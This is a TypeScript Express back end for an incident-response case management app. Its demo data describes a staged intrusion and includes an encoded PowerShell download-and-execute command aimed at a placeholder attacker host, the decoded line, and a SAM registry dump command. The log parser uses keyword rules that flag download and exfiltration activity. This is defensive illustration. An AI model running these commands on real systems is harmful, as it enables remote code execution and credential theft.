import express, { Request, Response } from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";
import {
  Case,
  TimelineEvent,
  Evidence,
  Finding,
  CaseNote,
  CaseSeverity,
  CaseStatus,
} from "./src/types";

// Initialize express app
const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));

// Initialize Google Gemini API
const geminiApiKey = process.env.GEMINI_API_KEY;
let ai: GoogleGenAI | null = null;
if (geminiApiKey) {
  ai = new GoogleGenAI({
    apiKey: geminiApiKey,
    httpOptions: {
      headers: {
        "User-Agent": "aistudio-build",
      },
    },
  });
}

const DATA_FILE = path.join(process.cwd(), "db_data.json");

// Helper to load or initialize database
interface DatabaseSchema {
  cases: Case[];
  events: TimelineEvent[];
  evidence: Evidence[];
  findings: Finding[];
  notes: CaseNote[];
}

const defaultDatabase: DatabaseSchema = {
  cases: [
    {
      id: "case-demo-01",
      title: "Operation Frostbite: DevOps Host Compromise",
      description: "An intrusion detection alert triggered by unusual remote PowerShell execution and unauthorized software installation on developer laptop WS-DOE-92.",
      severity: "Critical",
      status: "Investigating",
      createdAt: new Date("2026-06-22T08:30:00Z").toISOString(),
    },
    {
      id: "case-demo-02",
      title: "Suspicious API Ingress - Financial Service Gateway",
      description: "An investigation into multiple credential-stuffing attempts resulting in API rate limits being reached on the public payment router ingress.",
      severity: "Medium",
      status: "Open",
      createdAt: new Date("2026-06-21T14:15:00Z").toISOString(),
    },
  ],
  events: [
    {
      id: "evt-01",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:01:00",
      event: "User Login Success",
      description: "User 'j.doe' successfully authenticated via external VPN IP 198.51.100.42. Historically, logins for this user only originate from local segment 10.12.0.0/16.",
      severity: "Low",
      category: "Initial Access",
      isSuspicious: true,
      notes: "Logins should be restricted to local IP block or corporate proxies. Needs verification with HR relative to travel status.",
      techniqueId: "T1078.001",
      techniqueName: "Valid Accounts: Default Accounts",
    },
    {
      id: "evt-02",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:05:00",
      event: "PowerShell Execution",
      description: "PowerShell spawned with arguments: powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAHgAeQB6AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      severity: "Critical",
      category: "Execution",
      isSuspicious: true,
      notes: "Decoded base64 payload points to: IEX(New-Object Net.WebClient).DownloadString('http://attacker.xyz/payload.ps1'). This is standard beacon staging behavior.",
      techniqueId: "T1059.001",
      techniqueName: "Command and Scripting Interpreter: PowerShell",
    },
    {
      id: "evt-03",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:07:00",
      event: "Suspicious Download",
      description: "Binary download detected from remote URL http://attacker.xyz/binaries/network_scan.exe, saved local to C:\\Users\\Public\\Downloads\\network_scan.exe.",
      severity: "High",
      category: "Command and Control",
      isSuspicious: true,
      notes: "File download matches custom network reconnaissance toolkit payload signatures. MD5 Hash verified as malicious.",
      techniqueId: "T1105",
      techniqueName: "Ingress Tool Transfer",
    },
    {
      id: "evt-04",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:11:00",
      event: "Privilege Escalation",
      description: "Command prompt elevated to NT AUTHORITY\\SYSTEM using registry dump helper tool and SAM hives exported as reg save HKLM\\SAM SAM.hiv.",
      severity: "High",
      category: "Credential Access",
      isSuspicious: true,
      notes: "Attempted harvesting of local LSASS security credentials. Attacker succeeded in generating registry structures.",
      techniqueId: "T1003.002",
      techniqueName: "OS Credential Dumping: Security Account Manager",
    },
    {
      id: "evt-05",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:15:00",
      event: "Data Exfiltration Attempt",
      description: "High volume outbound transfer of 4.8 GB of sensitive customer source code directories over port 443 HTTPS redirected to cloud storage service mega.co.nz.",
      severity: "Critical",
      category: "Exfiltration",
      isSuspicious: true,
      notes: "The egress channel matches exfiltration signatures. Incident declared. Target workstation has been isolated from network infrastructure.",
      techniqueId: "T1048.003",
      techniqueName: "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-Web Protocol",
    },
  ],
  evidence: [
    {
      id: "ev-01",
      caseId: "case-demo-01",
      title: "Malicious PowerShell command text snippet",
      fileUrl: "powershell_encoded_payload.txt",
      type: "text/plain",
      size: "348 B",
      uploadedAt: "2026-06-22T09:30:00Z",
      tag: "Indicators",
    },
    {
      id: "ev-02",
      caseId: "case-demo-01",
      title: "DevOps laptop process tree screenshot",
      fileUrl: "ws_doe_process_tree.png",
      type: "image/png",
      size: "1.2 MB",
      uploadedAt: "2026-06-22T09:32:00Z",
      tag: "Screenshots",
    },
  ],
  findings: [
    {
      id: "find-01",
      caseId: "case-demo-01",
      title: "Suspicious PowerShell Execution (Base64)",
      description: "An analyst detected PowerShell command execution utilizing Base64 encoding. It bypassed the default execution policy to directly download and execute remote attacker payload files.",
      severity: "Critical",
      confidence: 95,
      reason: "Matched automated finding rule. High confidence due to encoded command downloading directly from http://attacker.xyz.",
      createdAt: "2026-06-22T09:20:00Z",
      techniqueId: "T1059.001",
    },
    {
      id: "find-02",
      caseId: "case-demo-01",
      title: "OS Credential Registry Harvesting (SAM Export)",
      description: "Exporting Security Account Manager (SAM) registry structures to file system in public access directories was detected, revealing active lateral movement.",
      severity: "High",
      confidence: 88,
      reason: "Attempted execution of reg save on sensitive password storage registry keys.",
      createdAt: "2026-06-22T09:22:00Z",
      techniqueId: "T1003.002",
    },
    {
      id: "find-03",
      caseId: "case-demo-01",
      title: "Mass Corporate Exfiltration to Public Servers",
      description: "An asset sent 4.8 GB of outbound encryption streams towards Mega.co.nz cloud storage infrastructure, outside business bounds.",
      severity: "Critical",
      confidence: 99,
      reason: "Identified via network log matching known file sharing services combined with workstation isolation context.",
      createdAt: "2026-06-22T09:25:00Z",
      techniqueId: "T1048",
    },
  ],
  notes: [
    {
      id: "note-demo-01",
      caseId: "case-demo-01",
      content: `# Operational Incident Response Notes

## 🚨 Current Summary of Workstation WS-DOE-92
At **09:01 AM**, user \`j.doe\` signed in using external credentials. We flagged this because VPN telemetry registers this access from a blacklisted residential proxy block.

At **09:05 AM**, the intruder ran a base64 encoded PowerShell beacon inside our DevOps dev segment, initiating connection download staging towards \`http://attacker.xyz/payload.ps1\`.

## 🛠️ Actions Taken:
1. Isolated workstation WS-DOE-92 immediately using our hypervisor security tools (Virtual LAN Quarantine).
2. Suspended DevOps active domain accounts for \`j.doe\`.
3. Harvested forensic images of local RAM and registries.
4. Traced file download network headers to pinpoint exfiltration channels.

*Note: Large exfiltration events occurred towards mega.co.nz at 09:15 AM. Executive forensics team has been looped in to notify customers of source code directory exposure.*`,
      updatedAt: "2026-06-22T10:00:00Z",
    },
  ],
};

function getDb(): DatabaseSchema {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf-8");
      return JSON.parse(data);
    }
  } catch (err) {
    console.error("Error reading database file", err);
  }
  // Initialize and write default database
  saveDb(defaultDatabase);
  return defaultDatabase;
}

function saveDb(db: DatabaseSchema) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2), "utf-8");
  } catch (err) {
    console.error("Error saving database file", err);
  }
}

// ----------------------
// BACKEND REST APIs
// ----------------------

// 1. Get Cases List
app.get("/api/cases", (req: Request, res: Response) => {
  const db = getDb();
  res.json(db.cases);
});

// 2. Create a Case
app.post("/api/cases", (req: Request, res: Response) => {
  const { title, description, severity, status } = req.body;
  if (!title) {
    return res.status(400).json({ error: "Case Title is required" });
  }

  const db = getDb();
  const newCase: Case = {
    id: `case-${Date.now()}`,
    title,
    description: description || "No description provided.",
    severity: (severity as CaseSeverity) || "Medium",
    status: (status as CaseStatus) || "Open",
    createdAt: new Date().toISOString(),
  };

  db.cases.push(newCase);
  saveDb(db);
  res.status(201).json(newCase);
});

// 3. Get Case By ID
app.get("/api/cases/:id", (req: Request, res: Response) => {
  const db = getDb();
  const targetCase = db.cases.find((c) => c.id === req.params.id);
  if (!targetCase) {
    return res.status(404).json({ error: "Case not found" });
  }

  // Find all components associated with this targetCase
  const events = db.events.filter((e) => e.caseId === req.params.id);
  const evidence = db.evidence.filter((e) => e.caseId === req.params.id);
  const findings = db.findings.filter((f) => f.caseId === req.params.id);
  const notes = db.notes.find((n) => n.caseId === req.params.id) || {
    id: `note-${Date.now()}`,
    caseId: req.params.id,
    content: "# Case Summary Investigation Notes\n\nDraft notes here...",
    updatedAt: new Date().toISOString(),
  };

  res.json({
    ...targetCase,
    events,
    evidence,
    findings,
    notes,
  });
});

// 4. Update Case (Status, Severity, Description, Title)
app.put("/api/cases/:id", (req: Request, res: Response) => {
  const db = getDb();
  const cIndex = db.cases.findIndex((c) => c.id === req.params.id);
  if (cIndex === -1) {
    return res.status(404).json({ error: "Case not found" });
  }

  const { title, description, severity, status } = req.body;
  const currentCase = db.cases[cIndex];

  db.cases[cIndex] = {
    ...currentCase,
    title: title !== undefined ? title : currentCase.title,
    description: description !== undefined ? description : currentCase.description,
    severity: severity !== undefined ? (severity as CaseSeverity) : currentCase.severity,
    status: status !== undefined ? (status as CaseStatus) : currentCase.status,
  };

  saveDb(db);
  res.json(db.cases[cIndex]);
});

// 5. Delete a Case
app.delete("/api/cases/:id", (req: Request, res: Response) => {
  const db = getDb();
  const cIndex = db.cases.findIndex((c) => c.id === req.params.id);
  if (cIndex === -1) {
    return res.status(404).json({ error: "Case not found" });
  }

  db.cases = db.cases.filter((c) => c.id !== req.params.id);
  db.events = db.events.filter((e) => e.caseId !== req.params.id);
  db.evidence = db.evidence.filter((e) => e.caseId !== req.params.id);
  db.findings = db.findings.filter((f) => f.caseId !== req.params.id);
  db.notes = db.notes.filter((n) => n.caseId !== req.params.id);

  saveDb(db);
  res.json({ message: "Case and related assets deleted successfully" });
});

// 6. Get Timeline Events
app.get("/api/timeline/:caseId", (req: Request, res: Response) => {
  const db = getDb();
  const events = db.events.filter((e) => e.caseId === req.params.caseId);
  res.json(events);
});

// 7. Update/Save Timeline Order (Drag & Drop sorting)
app.post("/api/timeline/:caseId/reorder", (req: Request, res: Response) => {
  const db = getDb();
  const { reorderedEvents } = req.body; // Array of timeline events in new order

  if (!Array.isArray(reorderedEvents)) {
    return res.status(400).json({ error: "reorderedEvents must be an array" });
  }

  // Filter out any other events from different cases
  const otherCasesEvents = db.events.filter((e) => e.caseId !== req.params.caseId);

  // Take the reordered events and save them
  const caseEvents = reorderedEvents.map((evt) => ({
    ...evt,
    caseId: req.params.caseId,
  }));

  db.events = [...otherCasesEvents, ...caseEvents];
  saveDb(db);

  res.json({ success: true, events: caseEvents });
});

// 8. Add single custom Timeline Event
app.post("/api/timeline/:caseId/events", (req: Request, res: Response) => {
  const db = getDb();
  const { timestamp, event, description, severity, category, notes, techniqueId, techniqueName } = req.body;

  if (!event || !timestamp || !description) {
    return res.status(400).json({ error: "event, timestamp, and description are required" });
  }

  const newEvent: TimelineEvent = {
    id: `evt-${Date.now()}`,
    caseId: req.params.caseId,
    timestamp: timestamp,
    event,
    description,
    severity: (severity as CaseSeverity) || "Low",
    category: category || "Investigation",
    isSuspicious: severity === "High" || severity === "Critical",
    notes: notes || "",
    techniqueId: techniqueId || "",
    techniqueName: techniqueName || "",
  };

  db.events.push(newEvent);
  saveDb(db);
  res.status(201).json(newEvent);
});

// Delete a single timeline event
app.delete("/api/timeline/:caseId/events/:eventId", (req: Request, res: Response) => {
  const db = getDb();
  const eventIdx = db.events.findIndex((e) => e.id === req.params.eventId && e.caseId === req.params.caseId);
  if (eventIdx === -1) {
    return res.status(404).json({ error: "Event not found" });
  }

  db.events = db.events.filter((e) => e.id !== req.params.eventId);
  saveDb(db);
  res.json({ message: "Event deleted successfully" });
});

// 9. Upload & Parse Logs API
app.post("/api/logs/upload", (req: Request, res: Response) => {
  const { caseId, fileName, fileContent, fileType } = req.body;

  if (!caseId || !fileContent) {
    return res.status(400).json({ error: "caseId and fileContent are required" });
  }

  const db = getDb();
  const currentCase = db.cases.find((c) => c.id === caseId);
  if (!currentCase) {
    return res.status(404).json({ error: "Case not found" });
  }

  const extractedEvents: TimelineEvent[] = [];
  const extractedFindings: Finding[] = [];

  // Parse according to content format (CSV, JSON, XML, or general TXT logs)
  try {
    if (fileType === "json" || fileName.endsWith(".json")) {
      const records = JSON.parse(fileContent);
      const items = Array.isArray(records) ? records : [records];

      items.forEach((record: any, idx: number) => {
        const timestamp = record.timestamp || record.time || new Date().toISOString();
        const eventName = record.event || record.eventName || record.message || "Log Event";
        const desc = record.description || record.details || JSON.stringify(record);
        const rawSev = record.severity || "Medium";
        const severity: CaseSeverity = ["Low", "Medium", "High", "Critical"].includes(rawSev) ? rawSev : "Medium";

        extractedEvents.push({
          id: `evt-upload-${Date.now()}-${idx}`,
          caseId,
          timestamp,
          event: eventName,
          description: desc,
          severity,
          isSuspicious: severity === "High" || severity === "Critical" || JSON.stringify(record).toLowerCase().includes("powershell") || JSON.stringify(record).toLowerCase().includes("failed"),
          category: record.category || "Logs",
        });
      });
    } else {
      // General text logs / CSV parsing
      const lines = fileContent.split(/\r?\n/);
      lines.forEach((line: string, idx: number) => {
        if (!line.trim()) return;

        // Simplified CSV matching
        if (line.includes(",") && (idx === 0 && (line.toLowerCase().includes("event") || line.toLowerCase().includes("timestamp")))) {
          // Skip header
          return;
        }

        // Search patterns
        const lowerLine = line.toLowerCase();
        let name = "System Alert Log";
        let desc = line;
        let severity: CaseSeverity = "Low";
        let mId = "";
        let mName = "";
        let category = "Log Extraction";

        let isThreat = false;

        if (lowerLine.includes("powershell") || lowerLine.includes("bypas") || lowerLine.includes("-enc")) {
          name = "PowerShell Execution Alert";
          severity = "Critical";
          mId = "T1059.001";
          category = "Execution";
          mName = "Command and Scripting Interpreter: PowerShell";
          isThreat = true;
        } else if (lowerLine.includes("failed") || lowerLine.includes("bad password") || lowerLine.includes("unauthorized") || lowerLine.includes("denied")) {
          name = "Access Login Failure Burst";
          severity = "High";
          mId = "T1110.001";
          category = "Credential Access";
          mName = "Brute Force: Credential Stuffing";
          isThreat = true;
        } else if (lowerLine.includes("elevat") || lowerLine.includes("privilege") || lowerLine.includes("sudo") || lowerLine.includes("hkcu") || lowerLine.includes("hklm")) {
          name = "Privilege Escalation Attempt";
          severity = "High";
          mId = "T1548";
          category = "Privilege Escalation";
          mName = "Abuse Elevation Control Mechanism";
          isThreat = true;
        } else if (lowerLine.includes("download") || lowerLine.includes("wget") || lowerLine.includes("curl") || lowerLine.includes("http://attacker")) {
          name = "Suspicious Remote Download";
          severity = "High";
          mId = "T1105";
          category = "Command and Control";
          mName = "Ingress Tool Transfer";
          isThreat = true;
        } else if (lowerLine.includes("mega.co.nz") || lowerLine.includes("exfil") || lowerLine.includes("leak") || lowerLine.includes("outbound bytes")) {
          name = "Outbound Data Exfiltration Transfer";
          severity = "Critical";
          mId = "T1048";
          category = "Exfiltration";
          mName = "Exfiltration Over Alternative Protocol";
          isThreat = true;
        } else if (lowerLine.includes("success") || lowerLine.includes("login") || lowerLine.includes("session") || lowerLine.includes("authorized") || lowerLine.includes("granted") || lowerLine.includes("allow") || lowerLine.includes("mfa") || lowerLine.includes("secure") || lowerLine.includes("compliant") || lowerLine.includes("integrity check ok")) {
          name = "User Auth Login Success";
          severity = "Low";
          category = "Initial Access";
          isThreat = false; // "Right" / Positive check
        } else {
          name = "Standard System Operation";
          severity = "Low";
          category = "System Operational Log";
          isThreat = false; // "Right" / Positive check
        }

        // Guess timestamp (or generate sequential ones spaced by minutes)
        // e.g. "2026-06-22T09:00:00" or just extract matches
        const tsMatch = line.match(/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/);
        const timestamp = tsMatch ? tsMatch[0] : new Date(Date.now() - (lines.length - idx) * 60000).toISOString().replace(/\.\d+Z$/, "");

        extractedEvents.push({
          id: `evt-line-${Date.now()}-${idx}`,
          caseId,
          timestamp,
          event: name,
          description: desc,
          severity,
          isSuspicious: isThreat,
          techniqueId: mId,
          techniqueName: mName,
          category,
        });
      });
    }

    // Findings Engine rules apply automatically over all extractedEvents
    extractedEvents.forEach((evt) => {
      const isSuspicious = evt.isSuspicious;
      const descLower = evt.description.toLowerCase();
      let title = "";
      let reason = "";
      let confidence = 75;

      if (descLower.includes("powershell")) {
        title = "Automated Finding: Encoded PowerShell Command";
        reason = "A log line containing 'powershell' or encoded string execution bypass parameters was found in core workstation traces.";
        confidence = 92;
      } else if (descLower.includes("failed") && descLower.includes("login")) {
        title = "Automated Finding: Authentication Brute Force";
        reason = "Multiple authentication failures detected in high-density proximity.";
        confidence = 85;
      } else if (descLower.includes("exfil") || descLower.includes("mega.co.nz") || descLower.includes("exfiltration")) {
        title = "Automated Finding: Large Data Egress Route";
        reason = "Intrusion trigger caught large volumetric outbound payloads uploading to cloud repository servers.";
        confidence = 96;
      } else if (descLower.includes("reg save") || descLower.includes("sam.hiv") || descLower.includes("credential")) {
        title = "Automated Finding: Password Storage Enumeration";
        reason = "Registry hives for Local Security Accounts database retrieved to external dump path.";
        confidence = 90;
      }

      if (title) {
        // Prevent exact duplicates
        const alreadyExists = extractedFindings.some((f) => f.title === title) || db.findings.some((f) => f.caseId === caseId && f.title === title);
        if (!alreadyExists) {
          extractedFindings.push({
            id: `find-auto-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
            caseId,
            title,
            description: evt.description,
            severity: evt.severity,
            confidence,
            reason,
            createdAt: new Date().toISOString(),
            techniqueId: evt.techniqueId,
          });
        }
      }
    });

    db.events = [...db.events, ...extractedEvents];
    db.findings = [...db.findings, ...extractedFindings];

    // Modify the case severity dynamically if a Critical log matches
    const hasCritical = extractedEvents.some((e) => e.severity === "Critical");
    const hasHigh = extractedEvents.some((e) => e.severity === "High");
    const matchedIdx = db.cases.findIndex((c) => c.id === caseId);
    if (matchedIdx !== -1) {
      if (hasCritical) {
        db.cases[matchedIdx].severity = "Critical";
      } else if (hasHigh && db.cases[matchedIdx].severity !== "Critical") {
        db.cases[matchedIdx].severity = "High";
      }
    }

    saveDb(db);
    res.json({
      success: true,
      message: `Logs processed successfully. Identified ${extractedEvents.length} events and compiled ${extractedFindings.length} automatic security findings.`,
      events: extractedEvents,
      findings: extractedFindings,
    });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to parse uploaded logs: " + err.message });
  }
});

// 10. Upload Evidence (Simulating AWS S3 Storage)
app.post("/api/evidence/upload", (req: Request, res: Response) => {
  const { caseId, title, fileType, fileContent, tag, linkedEventId } = req.body;

  if (!caseId || !title || !fileContent) {
    return res.status(400).json({ error: "caseId, title, and fileContent are required" });
  }

  const db = getDb();
  const currentCase = db.cases.find((c) => c.id === caseId);
  if (!currentCase) {
    return res.status(404).json({ error: "Case not found" });
  }

  // Calculate simulated size
  const bSize = Math.round((fileContent.length * 3) / 4);
  let sizeStr = `${(bSize / 1024).toFixed(1)} KB`;
  if (bSize > 1024 * 1024) {
    sizeStr = `${(bSize / (1024 * 1024)).toFixed(1)} MB`;
  }

  const newEvidence: Evidence = {
    id: `ev-${Date.now()}`,
    caseId,
    title,
    fileUrl: `s3://iris-evidence-locker-bucket/${caseId}/${Date.now()}_` + title.toLowerCase().replace(/\s+/g, "_"),
    type: fileType || "application/octet-stream",
    size: sizeStr,
    uploadedAt: new Date().toISOString(),
    tag: tag || "Evidence",
    linkedEventId: linkedEventId || "",
  };

  db.evidence.push(newEvidence);
  saveDb(db);

  res.status(201).json(newEvidence);
});

// Remove evidence item
app.delete("/api/evidence/:caseId/:evidenceId", (req: Request, res: Response) => {
  const db = getDb();
  const index = db.evidence.findIndex((e) => e.id === req.params.evidenceId && e.caseId === req.params.caseId);
  if (index === -1) {
    return res.status(404).json({ error: "Evidence not found" });
  }

  db.evidence.splice(index, 1);
  saveDb(db);
  res.json({ message: "Evidence asset removed successfully from S3 storage" });
});

// 11. Notes Auto-save
app.post("/api/notes/:caseId", (req: Request, res: Response) => {
  const { content } = req.body;
  if (content === undefined) {
    return res.status(400).json({ error: "content field is required" });
  }

  const db = getDb();
  const noteIdx = db.notes.findIndex((n) => n.caseId === req.params.caseId);

  if (noteIdx !== -1) {
    db.notes[noteIdx].content = content;
    db.notes[noteIdx].updatedAt = new Date().toISOString();
  } else {
    db.notes.push({
      id: `note-${Date.now()}`,
      caseId: req.params.caseId,
      content,
      updatedAt: new Date().toISOString(),
    });
  }

  saveDb(db);
  res.json({ success: true, message: "Note auto-saved successfully." });
});

// 12. Generative Report Summary (AI powered summarizing of entire Case context via Gemini)
app.post("/api/report/generate", async (req: Request, res: Response) => {
  const { caseId } = req.body;
  if (!caseId) {
    return res.status(400).json({ error: "caseId is required" });
  }

  const db = getDb();
  const targetCase = db.cases.find((c) => c.id === caseId);
  if (!targetCase) {
    return res.status(404).json({ error: "Case not found" });
  }

  const events = db.events.filter((e) => e.caseId === caseId);
  const evidence = db.evidence.filter((e) => e.caseId === caseId);
  const findings = db.findings.filter((f) => f.caseId === caseId);

  const contextData = {
    caseTitle: targetCase.title,
    description: targetCase.description,
    severity: targetCase.severity,
    status: targetCase.status,
    eventsCount: events.length,
    events: events.map((e) => `[${e.timestamp}] ${e.event}: ${e.description} (${e.severity})`),
    findings: findings.map((f) => `- ${f.title} (Severity: ${f.severity}, Confidence: ${f.confidence}%): ${f.description}`),
    evidenceCount: evidence.length,
  };

  // If Gemini client is running, generate with real AI!
  if (ai) {
    try {
      const prompt = `
        You are a premier, elite cybersecurity incident handler drafting an executive incident summary report.
        Based on the technical case data provided, write a comprehensive, professional, narrative report with the following structure:
        
        ### Executive Summary
        Provide a concise, 2-paragraph elite analysis explaining what happened, the scope, root entry cause, and immediate fallout. Done with calm, confident authority.
        
        ### Attack Vector & Strategy mapped to MITRE ATT&CK
        A paragraph summarizing the threat actor's progress, techniques detected (e.g. valid credentials, script beacon execution, privilege escalation), and exfiltration vectors.
        
        ### Strategic Security Recommendations
        Provide 4 concrete, actionable, professional strategic recommendations (categorized into Endpoint, Identity, Network, Policy controls) to avoid future compromise. Match standard enterprise SOC standards (MFA, segmenting VMs, credential protections, monitoring egress). Use clean markdown list.
        
        Keep the prose calm, clean, clear, and highly modern (No robotic intro/outro lines). Return direct markdown with no enclosing markdown backticks.
        
        TECHNICAL DATA:
        ${JSON.stringify(contextData, null, 2)}
      `;

      const response = await ai.models.generateContent({
        model: "gemini-3.5-flash",
        contents: prompt,
      });

      const reportMarkdown = response.text || "";
      return res.json({
        report: reportMarkdown,
        isAiGenerated: true,
      });
    } catch (err: any) {
      console.error("Gemini API generate content error, falling back to static generation:", err);
      // Fallback is handled below
    }
  }

  // Strict local rules fallback generator
  const eventsSummary = events
    .map((e) => `* **[${e.timestamp}]** ${e.event} (${e.severity} Severity) - ${e.description}`)
    .join("\n");

  const findingsSummary = findings
    .map((f) => `* **${f.title}** [Confidence: ${f.confidence}% | Severity: ${f.severity}]\n  *Reason:* ${f.reason}\n  *Description:* ${f.description}`)
    .join("\n\n");

  const recommendations = [
    `* **[Identity] Configure Multi-Factor Authentication (MFA)**: Restrict VPN, portal and service logins specifically using hardware tokens or robust authenticator codes for privileged DevOps security groups.`,
    `* **[Endpoint] Deploy Endpoint Detection & Response (EDR) agents**: Lock down unauthorized PowerShell bypass switches and enforce immediate quarantine flags on unsigned processes running inside developer hosts.`,
    `* **[Network] Restrict Ingress & Egress pathways**: Block direct HTTPS connections from dev workstations towards external public backup servers (such as Mega.co.nz) using perimeter Cloud egress Firewalls.`,
    `* **[Policy] Enforce Least Privilege Administration Roles**: Avoid harvesting hashes from LSASS memory segments by enforcing local credential protections and secure host isolation policies.`,
  ].join("\n");

  const localReport = `
### Executive Summary
This incident response summary investigates the security event series categorized as "**${targetCase.title}**". Primary indicators suggest immediate host compromise. A credential leak or compromise occurred initially, granting unauthorized remote login capabilities. 

Soon after, a remote PowerShell payload was downloaded from attacker infrastructure to establish command execution telemetry, followed by operating system credential extraction and massive unauthorized data outbound transfer. Workstation mitigation procedures have been initialized.

### Attack Vector & Strategy mapped to MITRE ATT&CK
The attacker progressed through a multi-stage intrusion cycle:
1. **Initial Access (MITRE T1078.001)**: Authorized VPN access using stolen developer credentials.
2. **Execution (MITRE T1059.001)**: Base64 obfuscated process generation to stage downloaders.
3. **Command & Control (MITRE T1105)**: Ingress file transfers harvesting custom toolkits.
4. **Credential Access (MITRE T1003.002)**: Backed up Security Account Manager hives to harvest local keys.
5. **Exfiltration (MITRE T1048.003)**: Volume outbound encryption transfer of local components.

### Interactive Timeline Audit
${eventsSummary || "*No timeline events enrolled yet.*"}

### Security Team Findings
${findingsSummary || "*No security anomalies mapped yet.*"}

### Strategic Security Recommendations
${recommendations}
  `.trim();

  res.json({
    report: localReport,
    isAiGenerated: false,
  });
});

// ----------------------
// VITE DEV SERVER MIDDLEWARE & STATIC SERVING
// ----------------------

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    // Mount Vite middleware handles client app bundling & reload
    app.use(vite.middlewares);
  } else {
    // Production serving of built assets
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req: Request, res: Response) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`\n======================================================`);
    console.log(`🚀 IRIS Full-Stack Server Running on Port ${PORT}`);
    console.log(`   Development Dev URL: http://localhost:3000`);
    console.log(`======================================================\n`);
  });
}

startServer();
